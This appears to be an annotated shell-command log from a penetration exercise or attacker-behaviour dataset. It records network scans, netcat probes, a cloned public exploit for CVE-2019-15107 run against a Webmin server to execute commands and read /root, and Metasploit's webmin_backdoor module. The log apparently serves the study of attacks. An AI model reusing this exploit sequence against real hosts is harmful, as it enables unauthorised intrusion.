User 86 start time 1594797708 end 1594802449
PADDING
PADDING
PADDING
INPUT|86--0|U|1594797708|86|curl ipconfig.co|OUTPUT
INPUT|86--1|U|1594797802|86|dig +short myip.opendns.com|OUTPUT
INPUT|86--2|M0 |1594798228|86|nmap 172.18.1.5 -p 0-65535|OUTPUT
INPUT|86--3|U|1594798284|86|nc 172.18.1.6:10000|OUTPUT
INPUT|86--4|U|1594798288|86|nc 172.18.1.6 10000|OUTPUT
INPUT|86--5|U|1594798291|86|wat|OUTPUT
INPUT|86--6|U|1594798301|86|nc 172.18.1.5 10000|OUTPUT
INPUT|86--7|U|1594798740|86|git clone https://github.com/jas502n/cve-2019-15107|OUTPUT
INPUT|86--8|U|1594798747|86|git clone https://github.com/jas502n/cve-2019-15107|OUTPUT
INPUT|86--9|A13 |1594798772|86|python CVE_2019_15107.py http://172.18.1.5:10000|OUTPUT
INPUT|86--10|A13 |1594798782|86|python CVE_2019_15107.py http://172.18.1.5:10000 id|OUTPUT
INPUT|86--11|A10 A13 |1594798789|86|python CVE_2019_15107.py http://172.18.1.5:10000 ls|OUTPUT
INPUT|86--12|A10 A13 |1594798793|86|python CVE_2019_15107.py http://172.18.1.5:10000 ls /root|OUTPUT
INPUT|86--13|A10 A13 |1594798800|86|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /root'|OUTPUT
INPUT|86--14|M9 |1594798819|86|python CVE_2019_15107.py http://172.18.1.5:10000 'cat /root/WARNING-READ-ME.txt'|OUTPUT
INPUT|86--15|A10 A13 |1594798844|86|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -l /root'|OUTPUT
INPUT|86--16|U|1594798894|86|ip a|OUTPUT
INPUT|86--17|M0 |1594798926|86|nmap 172.18.1.5|OUTPUT
INPUT|86--18|A0 A1 |1594798933|86|nmap 172.18.1.0/24|OUTPUT
INPUT|86--19|A0 A1 |1594799000|86|nmap 172.18.0.0/16|OUTPUT
INPUT|86--20|A0 A1 |1594799009|86|nmap 172.18.0.0/16|OUTPUT
INPUT|86--21|U|1594799134|86|msf|OUTPUT
INPUT|86--22|U|1594799136|86|metaflac|OUTPUT
INPUT|86--23|M2 |1594799144|86|msfconsole|OUTPUT
INPUT|86--24|M8 |1594799243|86|use exploit/linux/http/webmin_backdoor|OUTPUT
INPUT|86--25|M2 |1594799196|86|msfconsole|OUTPUT
INPUT|86--26|M3 |1594799306|86|search webmin|OUTPUT
